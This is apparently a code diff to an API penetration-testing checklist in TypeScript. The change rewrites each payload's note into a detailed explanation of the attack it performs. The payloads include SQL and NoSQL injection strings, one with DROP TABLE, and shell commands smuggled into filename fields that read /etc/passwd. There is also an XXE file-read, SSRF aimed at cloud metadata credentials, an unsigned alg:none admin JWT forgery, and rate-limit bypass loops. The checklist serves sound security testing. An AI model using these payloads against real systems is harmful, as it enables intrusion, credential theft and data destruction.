@@ -16,9 +16,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Search for /swagger.json, /openapi.yaml, /v2/api-docs, and public Postman collections that map the full API surface.",
         payloads: ["/swagger-ui.html", "/v3/api-docs", "/openapi.json"],
         payloadNotes: [
-          "Loads the Swagger UI page to see if interactive API docs are publicly rendered.",
-          "Fetches the raw OpenAPI v3 JSON spec describing all endpoints and parameters.",
-          "Requests a common alternate path for the OpenAPI spec file.",
+          "Loads /swagger-ui.html, the default path Swagger's bundled UI is served from, to see if interactive API docs are publicly rendered without authentication.",
+          "Fetches /v3/api-docs, the default springdoc/Swagger v3 path for the raw OpenAPI JSON spec, exposing every documented endpoint and parameter.",
+          "Requests /openapi.json, a common alternate filename frameworks use to serve the same OpenAPI spec, in case the v3 path above is disabled.",
         ],
         expectedResponse: {
           vulnerable: "The Swagger/OpenAPI/Postman docs are publicly reachable and reveal internal endpoints, parameters, and auth schemes not meant for outside consumption.",
@@ -32,9 +32,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Check for older/unlisted API versions still active — they often lack fixes applied to the current version.",
         payloads: ["/api/v1/users", "/api/v2/users", "/api/beta/users"],
         payloadNotes: [
-          "Checks whether the old v1 users endpoint is still live.",
-          "Checks the v2 users endpoint for comparison against v1's behavior.",
-          "Checks whether an unlisted beta version of the endpoint is active.",
+          "Requests /api/v1/users, using the v1 path segment to check whether the oldest, most likely least-patched version of the endpoint is still live.",
+          "Requests /api/v2/users, swapping only the version segment to v2 so its response/headers can be diffed against v1's behavior.",
+          "Requests /api/beta/users, using the beta path segment to probe for an unlisted pre-release version that may lack production hardening.",
         ],
         expectedResponse: {
           vulnerable: "An older version like /api/v1/ is still live and responds successfully, potentially missing security fixes applied only to /v2/ or later.",
@@ -48,9 +48,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Decompile the mobile app or read the web JS bundle to find internal/undocumented endpoints not in public docs.",
         payloads: ["apktool d app.apk -o app_decoded", "grep -rEo \"https?://[a-zA-Z0-9./?=_-]*\" main.js", "jadx -d out app.apk"],
         payloadNotes: [
-          "Decompiles the Android APK's resources and manifest into readable files.",
-          "Extracts every URL string embedded in the JS bundle.",
-          "Decompiles the APK's Java bytecode back into readable source code.",
+          "apktool d app.apk -o app_decoded: d runs decode mode on app.apk, and -o app_decoded sets the output folder, unpacking resources, the manifest, and smali code into readable files for endpoint hunting.",
+          "grep -rEo \"https?://[a-zA-Z0-9./?=_-]*\" main.js: -r searches recursively, -E enables extended regex, and -o prints only the matched substring, pulling out every http(s) URL literal embedded in the JS bundle.",
+          "jadx -d out app.apk: -d out sets the output directory and app.apk is the input, decompiling the APK's DEX bytecode into readable Java source to spot hardcoded endpoints and secrets.",
         ],
         expectedResponse: {
           vulnerable: "The decompiled app/JS bundle reveals hardcoded internal API URLs, hidden parameters, or admin routes not present in public documentation.",
@@ -63,7 +63,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Fuzz for hidden/internal API endpoints",
         how: "Use a wordlist against the base API path to discover undocumented routes (e.g. /api/internal/, /api/admin/).",
         payloads: ["ffuf -u https://api.example.com/FUZZ -w api-wordlist.txt"],
-        payloadNotes: ["Brute-forces the API path with a wordlist to discover hidden routes."],
+        payloadNotes: ["ffuf -u https://api.example.com/FUZZ -w api-wordlist.txt: -u sets the target URL with the FUZZ keyword marking the injection point, and -w supplies the wordlist ffuf substitutes into FUZZ one entry at a time to brute-force hidden routes."],
         expectedResponse: {
           vulnerable: "The fuzzer returns 200/301/403 (as opposed to a uniform 404) for paths like /api/internal/ or /api/admin/, confirming a hidden route exists.",
           safe: "All undocumented paths consistently return 404 with no distinguishing status/length/timing difference from genuinely nonexistent routes.",
@@ -76,9 +76,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Probe common GraphQL paths — apps often run both a REST and a less-tested GraphQL API in parallel.",
         payloads: ["/graphql", "/api/graphql", "/v1/graphql"],
         payloadNotes: [
-          "Checks the default GraphQL endpoint path.",
-          "Checks an alternate namespaced GraphQL path.",
-          "Checks a versioned GraphQL path.",
+          "Requests /graphql, the framework-default mount path most GraphQL servers (Apollo, express-graphql) listen on by convention.",
+          "Requests /api/graphql, an alternate path some apps use to namespace GraphQL alongside their REST routes under /api.",
+          "Requests /v1/graphql, a versioned path pattern (common with Hasura-style deployments) in case the GraphQL API is version-prefixed like the REST one.",
         ],
         expectedResponse: {
           vulnerable: "A GraphQL endpoint responds to introspection or a basic query, revealing a second, less-audited attack surface running alongside the REST API.",
@@ -92,8 +92,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Fingerprint the gateway (Kong, Apigee, AWS API Gateway) via headers/error pages — informs bypass and rate-limit testing later.",
         payloads: ["curl -I https://api.example.com/ | grep -i 'via\\|x-kong\\|x-amzn'", "curl -X TRACE https://api.example.com/"],
         payloadNotes: [
-          "Fetches response headers and filters for gateway-identifying header names.",
-          "Sends a TRACE request to see if it's echoed back, revealing proxy chain details.",
+          "curl -I https://api.example.com/ | grep -i 'via\\|x-kong\\|x-amzn': -I fetches only response headers, piped into grep -i (case-insensitive) matching via, x-kong, or x-amzn to spot gateway-identifying header names.",
+          "curl -X TRACE https://api.example.com/: -X TRACE overrides the method to TRACE, checking if the server echoes the raw request back and leaks proxy/gateway chain details in the response.",
         ],
         expectedResponse: {
           vulnerable: "Response headers or a TRACE request reveal the specific gateway/WAF product and version, which can be matched to known bypass techniques.",
@@ -107,9 +107,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Public changelogs sometimes mention internal endpoint or feature names useful for further enumeration.",
         payloads: ["/changelog.json", "/release-notes", "/api/CHANGELOG.md"],
         payloadNotes: [
-          "Requests a JSON changelog file that may list internal endpoints.",
-          "Requests a release-notes page for internal feature or endpoint mentions.",
-          "Requests a markdown changelog file under the API path.",
+          "Requests /changelog.json, a common structured changelog path, looking for internal endpoint or feature-flag names listed in its entries.",
+          "Requests /release-notes, a typical human-readable notes page, scanning prose for mentions of internal features or routes.",
+          "Requests /api/CHANGELOG.md, a markdown changelog nested under the API path itself rather than the site root, in case docs are colocated with the API.",
         ],
         expectedResponse: {
           vulnerable: "The changelog exposes internal endpoint names, feature flags, or infrastructure details useful for further recon.",
@@ -131,9 +131,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Call endpoints with no key, an invalid key, or another user's key and compare responses.",
         payloads: ["curl https://api.example.com/v1/users", "curl -H 'X-API-Key: invalid123' https://api.example.com/v1/users", "curl -H \"X-API-Key: $OTHER_USER_KEY\" https://api.example.com/v1/users"],
         payloadNotes: [
-          "Calls the endpoint with no API key at all.",
-          "Calls the endpoint with a clearly invalid API key value.",
-          "Calls the endpoint using another user's valid key to check for key confusion.",
+          "curl https://api.example.com/v1/users: a plain request with no API key header at all, checking if the endpoint requires a key to respond.",
+          "curl -H 'X-API-Key: invalid123' ...: -H sets the X-API-Key header to the obviously-invalid string invalid123, checking whether the server actually validates key format/existence.",
+          "curl -H \"X-API-Key: $OTHER_USER_KEY\" ...: -H sets X-API-Key to another user's real key (from the shell variable $OTHER_USER_KEY), testing for key confusion between accounts.",
         ],
         expectedResponse: {
           vulnerable: "Requests with no key, an invalid key, or a value that isn't checked at all still return valid data (HTTP 200) instead of being rejected.",
@@ -147,8 +147,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Swap the object ID in the request path/body with another user's ID using your own valid token.",
         payloads: ["curl -H 'Authorization: Bearer <your_token>' https://api.example.com/v1/users/1002/profile", "curl -H 'Authorization: Bearer <your_token>' https://api.example.com/v1/orders/5001"],
         payloadNotes: [
-          "Fetches another user's profile (id 1002) using your own valid token.",
-          "Fetches another user's order (id 5001) using your own valid token.",
+          "curl -H 'Authorization: Bearer <your_token>' .../users/1002/profile: -H carries your own valid bearer token while the path segment 1002 targets a different user's numeric ID, testing BOLA on the profile resource.",
+          "curl -H 'Authorization: Bearer <your_token>' .../orders/5001: same authenticated token, but the /orders/5001 path targets an order ID that presumably belongs to another user.",
         ],
         expectedResponse: {
           vulnerable: "Swapping the object ID in the URL/body while using your own valid token returns another user's data with HTTP 200.",
@@ -162,8 +162,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Call admin-only or higher-privilege endpoints/methods using a low-privileged user's token.",
         payloads: ["curl -H 'Authorization: Bearer <low_priv_token>' -X DELETE https://api.example.com/v1/admin/users/42", "curl -H 'Authorization: Bearer <low_priv_token>' https://api.example.com/v1/admin/reports"],
         payloadNotes: [
-          "Attempts to delete another user via an admin-only endpoint using a low-privileged token.",
-          "Attempts to read admin reports using a low-privileged token.",
+          "curl -H 'Authorization: Bearer <low_priv_token>' -X DELETE .../admin/users/42: -H supplies a deliberately low-privileged token, -X DELETE sets the destructive method, and the /admin/users/42 path targets an admin-only user-deletion function.",
+          "curl -H 'Authorization: Bearer <low_priv_token>' .../admin/reports: the same low-privileged token is used on a GET to an admin-only reports endpoint to check function-level access control.",
         ],
         expectedResponse: {
           vulnerable: "A low-privileged token can successfully call admin-only endpoints/methods (e.g. DELETE on /admin/users) and receive a 200/204 success response.",
@@ -177,8 +177,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "If tokens support scopes (read-only, write), confirm a read-only token can't perform write operations.",
         payloads: ["curl -H 'Authorization: Bearer <read_only_token>' -X POST https://api.example.com/v1/users -d '{\"name\":\"test\"}'", "curl -H 'Authorization: Bearer <read_only_token>' -X DELETE https://api.example.com/v1/users/1"],
         payloadNotes: [
-          "Attempts to create a user using a read-only scoped token.",
-          "Attempts to delete a user using a read-only scoped token.",
+          "curl -H 'Authorization: Bearer <read_only_token>' -X POST .../users -d '{\"name\":\"test\"}': -H supplies a read-only scoped token, -X POST sets a write method, and -d sends a minimal JSON body creating a user, testing whether scope is enforced server-side.",
+          "curl -H 'Authorization: Bearer <read_only_token>' -X DELETE .../users/1: the same read-only token is reused with -X DELETE against user ID 1 to confirm destructive writes are also blocked, not just creates.",
         ],
         expectedResponse: {
           vulnerable: "A read-only scoped token is still able to perform POST/DELETE writes and the server processes the change.",
@@ -192,9 +192,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Check if the same resource is reachable through an internal/legacy/undocumented endpoint that skips the auth middleware.",
         payloads: ["curl https://api.example.com/internal/v1/users/1", "curl https://legacy-api.example.com/v1/users/1", "curl https://api.example.com/v1//users/1"],
         payloadNotes: [
-          "Requests the resource via an internal-labeled path that may skip the auth middleware.",
-          "Requests the same resource via a legacy subdomain that may skip the auth middleware.",
-          "Requests with a double slash to see if path normalization skips the auth middleware.",
+          "curl https://api.example.com/internal/v1/users/1: prefixes the path with /internal/, testing whether an internal-labeled route to the same user resource bypasses the auth middleware bound only to the public path.",
+          "curl https://legacy-api.example.com/v1/users/1: swaps the host to a legacy-api subdomain serving the same resource, testing if that older deployment lacks the current auth checks.",
+          "curl https://api.example.com/v1//users/1: inserts a double slash (v1//users) into the path, testing whether path normalization differences let this variant reach the handler while skipping route-matched auth middleware.",
         ],
         expectedResponse: {
           vulnerable: "An internal/legacy/double-slash variant of the endpoint returns the resource without requiring the auth header the primary route enforces.",
@@ -208,8 +208,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Use an expired or explicitly revoked token/API key and confirm the API actually rejects it.",
         payloads: ["curl -H 'Authorization: Bearer <expired_token>' https://api.example.com/v1/profile", "curl -H 'Authorization: Bearer <revoked_token>' https://api.example.com/v1/profile"],
         payloadNotes: [
-          "Calls the endpoint with a token past its expiry time.",
-          "Calls the endpoint with a token that was explicitly revoked.",
+          "curl -H 'Authorization: Bearer <expired_token>' .../profile: -H sends a bearer token whose exp claim/expiry has already passed, checking if the server still honors it.",
+          "curl -H 'Authorization: Bearer <revoked_token>' .../profile: -H sends a token that was explicitly invalidated (e.g. via logout or admin revocation) to confirm the server checks a revocation list rather than only the signature.",
         ],
         expectedResponse: {
           vulnerable: "An expired or explicitly revoked token still returns authenticated data instead of an auth error.",
@@ -223,9 +223,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Decode the JWT, modify role/scope claims, and check if signature verification is properly enforced server-side.",
         payloads: ["echo '<jwt_payload_base64>' | base64 -d", "jwt_tool <token> -T", "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, '', algorithm='none'))\""],
         payloadNotes: [
-          "Decodes the JWT payload to inspect its claims.",
-          "Runs jwt_tool's tamper mode to modify and test JWT claims automatically.",
-          "Forges a token with role:admin using the \"none\" algorithm to bypass signature verification.",
+          "echo '<jwt_payload_base64>' | base64 -d: pipes the JWT's base64url-encoded payload segment into base64 -d (decode) to reveal the raw JSON claims, such as role or scope.",
+          "jwt_tool <token> -T: passes the captured token as the target and -T enables jwt_tool's tamper mode, which interactively lets you edit claims and re-test the server's acceptance of each variant.",
+          "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, '', algorithm='none'))\": jwt.encode builds a new token with the claim {'role':'admin'}, an empty secret (''), and algorithm='none', forging an unsigned admin token to test if the server skips signature verification.",
         ],
         expectedResponse: {
           vulnerable: "Modifying the role/scope claim (or using alg:none) results in the server trusting the tampered claim and granting elevated access.",
@@ -239,8 +239,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Check if API keys are passed as query parameters (logged in server/proxy access logs, browser history) instead of headers.",
         payloads: ["curl 'https://api.example.com/v1/users?api_key=sk_live_xxxxx'", "grep -r 'api_key=' /var/log/nginx/access.log"],
         payloadNotes: [
-          "Sends the API key as a URL query parameter instead of a header.",
-          "Searches server access logs for API keys leaked via query strings.",
+          "curl 'https://api.example.com/v1/users?api_key=sk_live_xxxxx': the api_key query-string parameter carries the secret key directly in the URL instead of an Authorization/X-API-Key header, where it can leak via logs, history, or referrers.",
+          "grep -r 'api_key=' /var/log/nginx/access.log: -r searches recursively (relevant if pointed at a log directory) for the literal string api_key= to confirm keys sent via query string were actually persisted in the access log.",
         ],
         expectedResponse: {
           vulnerable: "API keys appear in URL query strings and subsequently show up in server access logs, browser history, or referrer headers.",
@@ -254,8 +254,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Change a tenant/org identifier in the request while keeping your own valid token to access another tenant's data.",
         payloads: ["curl -H 'Authorization: Bearer <your_token>' -H 'X-Tenant-Id: 9999' https://api.example.com/v1/data", "curl -H 'Authorization: Bearer <your_token>' https://api.example.com/v1/orgs/other-org-id/reports"],
         payloadNotes: [
-          "Requests data for a different tenant ID while using your own token.",
-          "Requests another org's reports by changing the org ID in the path.",
+          "curl -H 'Authorization: Bearer <your_token>' -H 'X-Tenant-Id: 9999' .../data: -H sets your own valid token alongside a second -H setting X-Tenant-Id to 9999, a tenant ID that isn't yours, testing if the server trusts the client-supplied header over the token's own tenant context.",
+          "curl -H 'Authorization: Bearer <your_token>' .../orgs/other-org-id/reports: your own token is kept, but the other-org-id path segment targets a different organization's reports endpoint.",
         ],
         expectedResponse: {
           vulnerable: "Changing the X-Tenant-Id or org ID in the request (while reusing your own token) returns another tenant's data.",
@@ -277,9 +277,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Fuzz every JSON field with SQLi/NoSQLi payloads, including nested objects and arrays.",
         payloads: ["{\"username\": \"admin' OR '1'='1\"}", "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "{\"search\": \"'; DROP TABLE users;--\"}"],
         payloadNotes: [
-          "Attempts a classic SQL injection auth bypass via the username field.",
-          "Attempts a NoSQL injection auth bypass using MongoDB's $ne operator.",
-          "Attempts a destructive SQL injection via the search field.",
+          "{\"username\": \"admin' OR '1'='1\"}: the username field breaks out of its quoted string with ' and appends OR '1'='1, a tautology intended to make a SQL WHERE clause always match and bypass authentication.",
+          "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}: both fields use MongoDB's $ne (not-equal) operator against null instead of a plain string, matching any document where the field simply exists — a classic NoSQL auth bypass.",
+          "{\"search\": \"'; DROP TABLE users;--\"}: the search field closes the current string with ', chains a destructive DROP TABLE statement with ;, and -- comments out the rest of the original query.",
         ],
         expectedResponse: {
           vulnerable: "A SQLi/NoSQLi payload in a JSON field alters query logic — e.g. auth bypass, extra rows returned, or a DB error/stack trace in the response.",
@@ -292,7 +292,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test mass assignment on update endpoints",
         how: "Add extra fields (e.g. isAdmin, role) to a PUT/PATCH body that aren't in the documented schema.",
         payloads: ["{\"isAdmin\":true}"],
-        payloadNotes: ["Adds an undocumented isAdmin field to see if mass assignment grants admin privileges."],
+        payloadNotes: ["{\"isAdmin\":true}: adds the field isAdmin set to true — a key absent from the documented request schema — to see if the server's update logic blindly binds every JSON key to the model instead of allow-listing expected fields."],
         expectedResponse: {
           vulnerable: "Adding an undocumented field like isAdmin:true to the update body actually flips that privileged field, visible in a subsequent GET.",
           safe: "The server ignores/rejects unrecognized fields via an allow-list, and the privileged field remains unchanged after the request.",
@@ -304,7 +304,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test for injection via array-type parameters",
         how: "Send unexpected array structures where a scalar value is expected — some frameworks mishandle type coercion, causing errors or bypasses.",
         payloads: ["{\"id\":[1,2]}"],
-        payloadNotes: ["Sends an array where a single numeric ID is expected, to test type-coercion handling."],
+        payloadNotes: ["{\"id\":[1,2]}: the id field holds a JSON array [1,2] instead of the single expected numeric value, testing whether the backend mishandles the type by querying/matching against both IDs or throwing an unhandled error."],
         expectedResponse: {
           vulnerable: "Sending an array where a scalar is expected causes a server error, type-confusion bypass, or unexpected filter behavior (e.g. matching multiple records).",
           safe: "The server validates parameter types strictly and returns a 400 validation error for the malformed array input.",
@@ -317,8 +317,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Bury a payload several levels deep in a nested object — validation logic often only checks top-level fields.",
         payloads: ["{\"order\":{\"customer\":{\"address\":{\"line1\":\"' OR '1'='1\"}}}}", "{\"filter\":{\"and\":[{\"or\":[{\"field\":\"$where\",\"value\":\"sleep(5)\"}]}]}}"],
         payloadNotes: [
-          "Buries a SQL injection payload several levels deep inside a nested address object.",
-          "Buries a NoSQL $where sleep(5) payload inside nested filter logic to detect injection via time delay.",
+          "{\"order\":{\"customer\":{\"address\":{\"line1\":\"' OR '1'='1\"}}}}: the injection string sits inside line1, nested three objects deep (order.customer.address), testing whether validation that only checks top-level fields misses it.",
+          "{\"filter\":{\"and\":[{\"or\":[{\"field\":\"$where\",\"value\":\"sleep(5)\"}]}]}}: nested and/or logic arrays bury a field key of $where (MongoDB's raw JS execution operator) with value sleep(5), aiming to trigger a 5-second delay if the nested value reaches an executable query context.",
         ],
         expectedResponse: {
           vulnerable: "The deeply nested payload still reaches the vulnerable sink (DB query, template, filter), causing an injection effect or delayed response (e.g. sleep executes).",
@@ -332,9 +332,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "If the API accepts filenames/paths for processing (image resize, PDF convert), test for OS command injection.",
         payloads: ["{\"filename\": \"image.jpg; cat /etc/passwd\"}", "{\"path\": \"report.pdf | id\"}", "{\"url\": \"file.png `whoami`\"}"],
         payloadNotes: [
-          "Appends a shell command to a filename to test for OS command injection.",
-          "Pipes the id command after a file path to test for command injection.",
-          "Uses backtick command substitution in a filename to test for command injection.",
+          "{\"filename\": \"image.jpg; cat /etc/passwd\"}: the filename value chains a second shell command with ;, appending cat /etc/passwd to run after the intended filename if it reaches an unsanitized shell call.",
+          "{\"path\": \"report.pdf | id\"}: the path value uses a pipe | to feed the output of report.pdf into the id command, testing if shell metacharacters in a path parameter get interpreted rather than treated as a literal filename.",
+          "{\"url\": \"file.png `whoami`\"}: the url value wraps whoami in backticks, a shell command-substitution syntax that executes whoami and inlines its output if the value is passed unsanitized to a shell.",
         ],
         expectedResponse: {
           vulnerable: "Shell metacharacters in a filename/path parameter execute on the server, evidenced by command output (e.g. contents of /etc/passwd) in the response or side effects.",
@@ -348,8 +348,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "If the API accepts application/xml, test standard XXE payloads even if the primary format is JSON.",
         payloads: ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "curl -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml https://api.example.com/v1/import"],
         payloadNotes: [
-          "Defines an external entity pointing at /etc/passwd to test if the XML parser resolves it.",
-          "Sends the XXE payload file as an XML request body to the import endpoint.",
+          "The <!DOCTYPE foo [...]> declares an internal DTD defining the entity xxe via SYSTEM \"file:///etc/passwd\", and &xxe; in the body references it, testing whether the parser resolves the local file into the response.",
+          "curl -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml .../import: -X POST sets the method, -H declares the body as application/xml so the server routes it to its XML parser, and --data-binary @xxe.xml sends the XXE payload file's raw bytes as the request body to the import endpoint.",
         ],
         expectedResponse: {
           vulnerable: "The XML parser resolves the external entity, returning file contents (e.g. /etc/passwd) or making an out-of-band request to an attacker-controlled server.",
@@ -363,8 +363,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Send a JSON payload with Content-Type: text/plain or vice versa to see if input validation is skipped for unexpected content types.",
         payloads: ["curl -X POST -H 'Content-Type: text/plain' -d '{\"role\":\"admin\"}' https://api.example.com/v1/users", "curl -X POST -H 'Content-Type: application/json' -d 'role=admin' https://api.example.com/v1/users"],
         payloadNotes: [
-          "Sends a JSON body labeled text/plain to see if schema validation is skipped for that content type.",
-          "Sends form-encoded data labeled application/json to test the same content-type confusion in reverse.",
+          "curl -X POST -H 'Content-Type: text/plain' -d '{\"role\":\"admin\"}' .../users: -H mislabels the Content-Type as text/plain even though -d sends actual JSON containing role:admin, testing if the JSON-schema validator only runs when the header says application/json.",
+          "curl -X POST -H 'Content-Type: application/json' -d 'role=admin' .../users: the reverse case — -H claims application/json while -d actually sends form-urlencoded data (role=admin), testing if the JSON parser/validator is skipped or a lenient parser still extracts the field.",
         ],
         expectedResponse: {
           vulnerable: "Sending JSON under a mismatched Content-Type (or vice versa) causes the server to skip schema validation and process fields like role:admin.",
@@ -378,9 +378,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Any parameter that accepts a URL (webhook, image fetch, import-from-URL) should be tested for SSRF.",
         payloads: ["{\"webhook_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}", "{\"import_url\": \"http://localhost:8080/admin\"}", "{\"image_url\": \"http://[::1]:6379/\"}"],
         payloadNotes: [
-          "Points the webhook URL at the cloud metadata service to test for SSRF-based credential theft.",
-          "Points the import URL at an internal admin service on localhost to test for SSRF.",
-          "Points the image URL at localhost's Redis port via IPv6 loopback to test for SSRF.",
+          "{\"webhook_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}: the webhook_url points at 169.254.169.254, the cloud provider metadata IP, with the /iam/security-credentials/ path targeting IAM credentials, testing if the server-side fetch reaches internal cloud metadata.",
+          "{\"import_url\": \"http://localhost:8080/admin\"}: import_url targets localhost:8080/admin, an internal-only admin service address, testing if the server blindly fetches URLs a client supplies.",
+          "{\"image_url\": \"http://[::1]:6379/\"}: image_url uses the IPv6 loopback literal [::1] on port 6379 (Redis's default port), testing SSRF while evading naive filters that only block the string \"localhost\" or \"127.0.0.1\".",
         ],
         expectedResponse: {
           vulnerable: "The webhook/import/image-fetch parameter causes the server to make a request to an internal address (e.g. metadata service or localhost), and the response leaks internal data.",
@@ -401,7 +401,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test for missing rate limiting on sensitive endpoints",
         how: "Send a burst of requests to login/OTP/password-reset endpoints and confirm throttling kicks in.",
         payloads: ["for i in {1..50}; do curl -s -o /dev/null -w '%{http_code}\\n' -X POST https://api.example.com/v1/login -d '{\"email\":\"a@a.com\",\"password\":\"wrong\"}'; done"],
-        payloadNotes: ["Sends 50 rapid failed login attempts in a loop to see if throttling kicks in."],
+        payloadNotes: ["for i in {1..50}; do ...; done: loops 50 times, each iteration using curl -s (silent) -o /dev/null (discard body) -w '%{http_code}\\n' (print only the status code) with -X POST and -d sending a wrong-password login attempt, to see if throttling/429s kick in as the count rises."],
         expectedResponse: {
           vulnerable: "Dozens of rapid requests to login/OTP/reset all return normal responses (200/401 per attempt) with no 429 or increasing delay.",
           safe: "After a small number of attempts the server returns 429 Too Many Requests or introduces increasing delay/lockout, throttling further attempts.",
@@ -413,7 +413,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test rate limit bypass via header manipulation",
         how: "Try alternate X-Forwarded-For/X-Real-IP values per request to see if IP-based limiting can be trivially bypassed.",
         payloads: ["X-Forwarded-For: 1.2.3.4"],
-        payloadNotes: ["Sends a spoofed X-Forwarded-For header per request to test if it resets the IP-based rate-limit counter."],
+        payloadNotes: ["X-Forwarded-For: 1.2.3.4: sets this header to a different arbitrary IP on each request, testing whether the rate limiter trusts the client-supplied forwarding header (instead of the real connecting IP) and resets its counter per spoofed value."],
         expectedResponse: {
           vulnerable: "Changing X-Forwarded-For per request resets the rate-limit counter, allowing unlimited requests despite hitting the same backend IP.",
           safe: "The rate limiter keys on an authenticated/session identifier or validates the real client IP, so spoofed forwarding headers don't reset the counter.",
@@ -426,8 +426,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Some gateways rate-limit by exact path match — try trailing slashes, case changes, or URL-encoded variants.",
         payloads: ["/API/login", "/api/login/"],
         payloadNotes: [
-          "Requests the login path with different casing to see if it evades the rate-limit bucket.",
-          "Requests the login path with a trailing slash to see if it evades the rate-limit bucket.",
+          "/API/login: capitalizes the path segments (API vs api) to test whether the rate limiter matches paths case-sensitively and treats this as a distinct, unthrottled bucket.",
+          "/api/login/: appends a trailing slash to the same path, testing whether the limiter's path-matching treats it as a different endpoint from /api/login.",
         ],
         expectedResponse: {
           vulnerable: "A case-changed or trailing-slash variant of the path bypasses the limiter and isn't counted against the same bucket as the canonical path.",
@@ -441,8 +441,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Request large page sizes, unbounded date ranges, or wildcard filters that force expensive backend computation.",
         payloads: ["?limit=999999", "?page_size=-1"],
         payloadNotes: [
-          "Requests an extremely large page size to test for unbounded resource consumption.",
-          "Requests a negative page size to see if it's misinterpreted as \"unlimited\".",
+          "?limit=999999: sets the limit query parameter to a huge value, testing whether the server caps result-set size server-side or tries to return/compute nearly a million rows.",
+          "?page_size=-1: sets page_size to a negative number, testing whether the backend's bounds check misinterprets -1 as \"no limit\" and returns the entire dataset.",
         ],
         expectedResponse: {
           vulnerable: "A huge limit/page_size value causes a noticeably slow response or high server resource usage, indicating no server-side cap is enforced.",
@@ -456,8 +456,8 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Request extremely high offset/page values to check if the database performs a full-table scan each time.",
         payloads: ["curl 'https://api.example.com/v1/items?offset=9999999&limit=100'", "curl 'https://api.example.com/v1/items?page=999999999'"],
         payloadNotes: [
-          "Requests items at a huge offset to test for a full-table-scan-based DoS.",
-          "Requests an extremely high page number to test pagination performance under deep offsets.",
+          "curl '.../items?offset=9999999&limit=100': the offset parameter is set to nearly ten million while limit=100 caps the returned rows, testing whether the database still has to scan/skip all preceding rows (a full-table-scan-based DoS) to reach that point.",
+          "curl '.../items?page=999999999': the page parameter is set to an extremely high page number, testing whether page-based pagination degrades the same way under a deep offset translation.",
         ],
         expectedResponse: {
           vulnerable: "Very high offset/page values cause increasing response latency, showing the database re-scans all preceding rows each time.",
@@ -470,7 +470,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test rate limiting per-token vs per-IP consistency",
         how: "Confirm limits can't be bypassed by rotating tokens/API keys from the same IP or vice versa.",
         payloads: ["for t in token1 token2 token3; do curl -H \"Authorization: Bearer $t\" https://api.example.com/v1/login; done"],
-        payloadNotes: ["Rotates between three different tokens from the same IP to test whether limits are bypassed by token rotation."],
+        payloadNotes: ["for t in token1 token2 token3; do ...; done: loops over three distinct tokens, each iteration setting -H \"Authorization: Bearer $t\" so every request carries a different token from the same client IP, testing whether limits keyed per-token can be bypassed simply by rotating credentials."],
         expectedResponse: {
           vulnerable: "Rotating between multiple tokens from the same IP (or using one token across many IPs) lets the combined request rate far exceed the intended single-identity limit.",
           safe: "The rate limit is enforced consistently whether keyed by token or IP, so rotating either dimension doesn't multiply the effective allowed rate.",
@@ -491,9 +491,9 @@ export const apiCategories: ChecklistCategory[] = [
         how: "Try alternate methods (PUT/DELETE/PATCH/TRACE) on endpoints that normally only accept GET/POST.",
         payloads: ["curl -X TRACE https://api.example.com/v1/users/1", "curl -X PUT https://api.example.com/v1/users/1 -d '{}'", "curl -X DELETE https://api.example.com/v1/users/1"],
         payloadNotes: [
-          "Sends a TRACE request to a user resource to see if an unsupported method is accepted.",
-          "Sends a PUT request to a user resource that's normally only readable.",
-          "Sends a DELETE request to a user resource that's normally only readable.",
+          "curl -X TRACE .../users/1: -X TRACE overrides the method on a resource that normally only accepts GET, testing if the server accepts an unsupported diagnostic method instead of returning 405.",
+          "curl -X PUT .../users/1 -d '{}': -X PUT sets a write method and -d sends an empty JSON body, testing if a read-only-looking endpoint actually accepts a full-replace update.",
+          "curl -X DELETE .../users/1: -X DELETE sets the destructive method against the same user resource to check if it's unexpectedly permitted.",
         ],
         expectedResponse: {
           vulnerable: "An unexpected method (PUT/DELETE/TRACE) on a GET/POST-only endpoint is accepted and performs an action instead of returning 405.",
@@ -506,7 +506,7 @@ export const apiCategories: ChecklistCategory[] = [
         text: "Test for excessive data exposure in list/collection endpoints",
         how: "Compare fields returned by a GET /resource list endpoint against what's actually shown in the UI — extra fields often leak.",
         payloads: ["curl -H 'Authorization: Bearer <token>' https://api.example.com/v1/users | jq '.[0]'"],
-        payloadNotes: ["Fetches the users list and inspects the first record's raw JSON for extra, unrendered fields."],
